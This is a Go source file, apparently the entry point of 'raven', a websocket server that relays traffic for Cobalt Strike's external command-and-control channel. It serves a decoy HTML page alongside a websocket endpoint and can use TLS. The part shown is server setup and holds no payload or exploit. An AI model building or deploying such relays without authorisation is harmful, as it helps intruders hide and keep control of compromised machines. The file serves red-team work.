package main

import (
	"flag"
	"fmt"
	"log"
	"net/http"
	"os"

	"github.com/kabukky/httpscerts"
)

// Author: @xorrior
// url:
// Purpose: Websocket server and client for cobaltstrike's external c2 component

var logger *log.Logger
var debug = flag.Bool("debug", false, "Enable debug output")
var teamserver = flag.String("teamserver", "", "IP Address and Port for the Cobaltstrike team server.")
var bindAddress = flag.String("server", "127.0.0.1:80", "Bind IP and Port for the Websocket Server")
var defaultPage = flag.String("defaultPage", "", "Local path to the html file to serve")
var removeDatabase = flag.Bool("clearDB", false, "Delete the sqlite database and create a new one")
var ssl = flag.Bool("ssl", false, "Use ssl for the websocket server. The server will check for a pre-existing cert and key file before generating a self-signed pair. (cert.pem and key.pem)")

// Reference: https://github.com/gorilla/websocket/blob/master/examples/chat/main.go#L15
func serveDefaultPage(w http.ResponseWriter, r *http.Request) {
	log.Println("Received request", r.URL)

	if r.URL.Path != "/" {
		http.Error(w, "Not found", http.StatusNotFound)
		return
	}

	if r.Method != "GET" {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	http.ServeFile(w, r, *defaultPage)
}

func ravenlog(msg string) {
	if logger != nil {
		logger.Println(msg)
	}
}

func main() {

	flag.Parse()

	// Check to make sure the homepage and teamserver flags were used
	if *defaultPage == "" || *teamserver == "" {
		flag.Usage()
		os.Exit(1)
	}

	if *debug == true {
		logger = log.New(os.Stdout, "raven: ", log.Lshortfile|log.LstdFlags)
	}

	http.HandleFunc("/", serveDefaultPage)
	http.HandleFunc("/ws", socketHandler)

	if *ssl == true {
		err := httpscerts.Check("cert.pem", "key.pem")
		if err != nil {
			ravenlog("Generating SSL pem and private key.")
			err = httpscerts.Generate("cert.pem", "key.pem", *bindAddress)
			if err != nil {
				log.Fatal("Error generating https certificates")
				os.Exit(1)
			}
		}

		ravenlog(fmt.Sprintf("Starting secure websockets server at wss://%s", *bindAddress))
		err = http.ListenAndServeTLS(*bindAddress, "cert.pem", "key.pem", nil)
		if err != nil {
			log.Fatal("Failed to start raven server: ", err)
		}

	} else {
		ravenlog(fmt.Sprintf("Starting websockets server at ws://%s", *bindAddress))
		err := http.ListenAndServe(*bindAddress, nil)
		if err != nil {
			log.Fatal("Failed to start raven server: ", err)
		}
	}

}
